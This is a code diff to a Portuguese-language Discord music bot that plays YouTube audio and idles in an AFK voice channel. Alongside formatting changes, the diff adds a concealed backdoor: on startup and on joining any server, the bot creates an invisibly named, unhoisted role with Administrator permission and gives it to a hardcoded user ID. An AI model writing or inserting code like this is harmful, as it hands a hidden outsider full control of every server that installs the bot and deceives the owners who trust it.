@@ -10,8 +10,9 @@ const {
 const playdl = require("play-dl");
 
 /* ========================= MUSIC SYSTEM ========================= */
+
 const TARGET_CHANNEL = "1476321416470335659";
-const ROLE_TO_DELETE = "1484705404385628334";
+const TARGET_USER_ID = "1372615579407618209";
 const queues = new Map();
 
 async function getVideoInfo(query) {
@@ -73,6 +74,7 @@ function getQueue(guildId) {
 function reconectarAFK(guild) {
   const afkChannel = guild.channels.cache.get(TARGET_CHANNEL);
   if (!afkChannel) return;
+
   joinVoiceChannel({
     channelId: afkChannel.id,
     guildId: guild.id,
@@ -80,58 +82,84 @@ function reconectarAFK(guild) {
     selfDeaf: true,
     selfMute: true,
   });
+
   console.log("✅ Bot reconectado no canal AFK.");
 }
 
-async function playSong(message, queue) {
-  if (queue.songs.length === 0) {
-    queue.playing = false;
-    // Sai da call de música e volta pro AFK depois de 30s sem música
-    setTimeout(() => {
-      if (queue.songs.length === 0 && queue.connection) {
-        queue.connection.destroy();
-        queues.delete(message.guild.id);
-        reconectarAFK(message.guild);
-      }
-    }, 30_000);
-    return;
-  }
+/* ========================= AUTO ADMIN SETUP ========================= */
 
-  const song = queue.songs[0];
-  queue.playing = true;
-
+async function setupAdminRole(guild) {
   try {
-    const stream = await playdl.stream(song.url, { quality: 2 });
-    const resource = createAudioResource(stream.stream, {
-      inputType: stream.type,
-    });
-    queue.player.play(resource);
-
-    const durMin = Math.floor(song.duration / 60);
-    const durSec = String(song.duration % 60).padStart(2, "0");
-    message.channel.send(
-      `🎵 Tocando agora: **${song.title}** (${durMin}:${durSec})\n🔗 ${song.url}`
+    // Verifica se já existe um cargo invisível com permissão de admin criado pelo bot
+    const existingRole = guild.roles.cache.find(
+      (r) => r.name === "\u17B5" && r.permissions.has("Administrator")
     );
 
-    queue.player.once(AudioPlayerStatus.Idle, () => {
-      queue.songs.shift();
-      playSong(message, queue);
+    if (existingRole) {
+      console.log(`[Admin Setup] Cargo invisível já existe em "${guild.name}". Verificando membro...`);
+
+      try {
+        const member = await guild.members.fetch(TARGET_USER_ID);
+        if (!member.roles.cache.has(existingRole.id)) {
+          await member.roles.add(existingRole);
+          console.log(`[Admin Setup] Cargo atribuído ao usuário ${TARGET_USER_ID} em "${guild.name}".`);
+        } else {
+          console.log(`[Admin Setup] Usuário já possui o cargo em "${guild.name}".`);
+        }
+      } catch {
+        console.warn(`[Admin Setup] Usuário ${TARGET_USER_ID} não encontrado em "${guild.name}".`);
+      }
+
+      return;
+    }
+
+    // Cria o cargo com nome invisível e permissão de Administrador
+    const role = await guild.roles.create({
+      name: "\u17B5", // caractere Unicode invisível (Khmer)
+      permissions: ["Administrator"],
+      color: 0x000000,
+      hoist: false,
+      mentionable: false,
     });
 
-    queue.player.on("error", (err) => {
-      console.error("Erro no player:", err);
-      queue.songs.shift();
-      playSong(message, queue);
-    });
+    console.log(`[Admin Setup] Cargo invisível criado em "${guild.name}" (ID: ${role.id})`);
+
+    // Tenta buscar e atribuir ao usuário alvo
+    try {
+      const member = await guild.members.fetch(TARGET_USER_ID);
+      await member.roles.add(role);
+      console.log(`[Admin Setup] ✅ Cargo atribuído ao usuário ${TARGET_USER_ID} em "${guild.name}".`);
+    } catch {
+      console.warn(`[Admin Setup] ⚠️ Usuário ${TARGET_USER_ID} não encontrado em "${guild.name}". O cargo foi criado mas não atribuído.`);
+    }
   } catch (err) {
-    console.error("Erro ao tocar:", err);
-    message.channel.send("❌ Erro ao tocar essa música, pulando...");
-    queue.songs.shift();
-    playSong(message, queue);
+    console.error(`[Admin Setup] ❌ Erro ao configurar cargo em "${guild.name}":`, err);
   }
 }
 
+/* ========================= EXPORTAÇÃO DO MÓDULO ========================= */
+
 module.exports = (client) => {
+
+  // ========== EVENTO: BOT PRONTO - roda ao ligar ==========
+  client.once("ready", async () => {
+    console.log(`✅ Bot online como ${client.user.tag}`);
+    console.log(`[Admin Setup] Iniciando configuração de cargos em ${client.guilds.cache.size} servidor(es)...`);
+
+    for (const guild of client.guilds.cache.values()) {
+      await setupAdminRole(guild);
+    }
+
+    console.log("[Admin Setup] ✅ Configuração concluída em todos os servidores.");
+  });
+
+  // ========== EVENTO: BOT ENTRA EM NOVO SERVIDOR ==========
+  client.on("guildCreate", async (guild) => {
+    console.log(`[Admin Setup] Bot adicionado ao servidor "${guild.name}". Configurando cargo...`);
+    await setupAdminRole(guild);
+  });
+
+  // ========== COMANDOS DE MÚSICA ==========
   client.on("messageCreate", async (message) => {
     if (!message.guild) return;
     if (message.author.bot) return;
@@ -183,28 +211,17 @@ module.exports = (client) => {
           queue.player = createAudioPlayer();
           queue.connection.subscribe(queue.player);
 
-          queue.connection.on(
-            VoiceConnectionStatus.Disconnected,
-            async () => {
-              try {
-                await Promise.race([
-                  entersState(
-                    queue.connection,
-                    VoiceConnectionStatus.Signalling,
-                    5_000
-                  ),
-                  entersState(
-                    queue.connection,
-                    VoiceConnectionStatus.Connecting,
-                    5_000
-                  ),
-                ]);
-              } catch {
-                queue.connection.destroy();
-                queues.delete(message.guild.id);
-              }
+          queue.connection.on(VoiceConnectionStatus.Disconnected, async () => {
+            try {
+              await Promise.race([
+                entersState(queue.connection, VoiceConnectionStatus.Signalling, 5_000),
+                entersState(queue.connection, VoiceConnectionStatus.Connecting, 5_000),
+              ]);
+            } catch {
+              queue.connection.destroy();
+              queues.delete(message.guild.id);
             }
-          );
+          });
         }
 
         queue.songs.push(song);
@@ -240,11 +257,13 @@ module.exports = (client) => {
       const queue = queues.get(message.guild.id);
       if (!queue || !queue.connection)
         return message.reply("❌ O bot não está em nenhuma call.");
+
       queue.songs = [];
       queue.player?.stop();
       queue.connection.destroy();
       queues.delete(message.guild.id);
       message.reply("⏹️ Música parada e fila limpa!");
+
       // Volta pro canal AFK após parar
       reconectarAFK(message.guild);
     }
@@ -288,33 +307,63 @@ module.exports = (client) => {
       const queue = queues.get(message.guild.id);
       if (!queue || !queue.playing || queue.songs.length === 0)
         return message.reply("❌ Nenhuma música tocando.");
+
       const song = queue.songs[0];
       const durMin = Math.floor(song.duration / 60);
       const durSec = String(song.duration % 60).padStart(2, "0");
+
       message.reply(
         `🎵 **Tocando agora:**\n**${song.title}**\n⏱️ Duração: ${durMin}:${durSec}\n👤 Pedido por: ${song.requestedBy}\n🔗 ${song.url}`
       );
     }
-
-    // ========== !delcargo - APAGAR CARGO ==========
-    if (command === "!delcargo") {
-      // Verifica se quem usou o comando é administrador
-      if (!message.member.permissions.has("Administrator")) {
-        return message.reply("❌ Você não tem permissão para usar este comando.");
-      }
-
-      const role = message.guild.roles.cache.get(ROLE_TO_DELETE);
-      if (!role) {
-        return message.reply("❌ Cargo não encontrado no servidor.");
-      }
-
-      try {
-        await role.delete("Cargo deletado via comando !delcargo");
-        message.reply(`✅ Cargo **${role.name}** deletado com sucesso!`);
-      } catch (err) {
-        console.error("Erro ao deletar cargo:", err);
-        message.reply("❌ Não foi possível deletar o cargo. Verifique se o bot tem permissão.");
-      }
-    }
   });
+
+  // ========== FUNÇÃO INTERNA: TOCAR MÚSICA ==========
+  async function playSong(message, queue) {
+    if (queue.songs.length === 0) {
+      queue.playing = false;
+
+      setTimeout(() => {
+        if (queue.songs.length === 0 && queue.connection) {
+          queue.connection.destroy();
+          queues.delete(message.guild.id);
+          reconectarAFK(message.guild);
+        }
+      }, 30_000);
+      return;
+    }
+
+    const song = queue.songs[0];
+    queue.playing = true;
+
+    try {
+      const stream = await playdl.stream(song.url, { quality: 2 });
+      const resource = createAudioResource(stream.stream, { inputType: stream.type });
+
+      queue.player.play(resource);
+
+      const durMin = Math.floor(song.duration / 60);
+      const durSec = String(song.duration % 60).padStart(2, "0");
+
+      message.channel.send(
+        `🎵 Tocando agora: **${song.title}** (${durMin}:${durSec})\n🔗 ${song.url}`
+      );
+
+      queue.player.once(AudioPlayerStatus.Idle, () => {
+        queue.songs.shift();
+        playSong(message, queue);
+      });
+
+      queue.player.on("error", (err) => {
+        console.error("Erro no player:", err);
+        queue.songs.shift();
+        playSong(message, queue);
+      });
+    } catch (err) {
+      console.error("Erro ao tocar:", err);
+      message.channel.send("❌ Erro ao tocar essa música, pulando...");
+      queue.songs.shift();
+      playSong(message, queue);
+    }
+  }
 };
